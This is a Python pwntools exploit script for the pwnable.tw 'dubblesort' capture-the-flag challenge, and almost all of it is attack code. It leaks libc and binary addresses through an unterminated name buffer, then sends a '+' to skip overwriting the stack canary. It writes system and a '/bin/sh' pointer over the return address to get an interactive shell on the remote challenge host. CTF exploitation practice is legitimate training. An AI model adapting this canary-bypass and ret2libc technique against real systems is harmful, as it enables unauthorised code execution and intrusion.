#!/usr/bin/env python3

from pwn import *

exe = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10101)

    return r


def main():
    r = conn()

    r.sendafter(b"What your name :", b"A" * 29)
    r.recvuntil(b"A" * 28)
    
    libc.address = (u32(r.recv(4)) & 0xFFFFF000) - 0x1af000 - 0x1000
    log.info(f"libc @ 0x{libc.address:x}")

    exe.address = u32(r.recv(4)) - 0x601
    log.info(f"binary @ 0x{exe.address:x}")

    r.sendlineafter(b"How many numbers", b"35")

    for _ in range(24):
        r.sendlineafter(b"number : ", b"0")

    r.sendlineafter(b"number : ", b"+")     # Send any arithmetical char to avoid overwriting stack canary

    # Write something (hopeful) bigger than canary but smaller than `system` for the
    # remaining stack addresses so the sorting won't screw the order
    for _ in range(7):
        r.sendlineafter(b"number : ", str(libc.address).encode("ascii"))

    r.sendlineafter(b"number : ", str(libc.sym.system).encode("ascii"))     # Return address
    r.sendlineafter(b"number : ", str(libc.sym.system).encode("ascii"))     # Dummy return address for `system` (it's not important what address is)
    r.sendlineafter(b"number : ", str(next(libc.search(b"/bin/sh\x00"))).encode("ascii"))   # Argument "/bin/sh"
    
    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
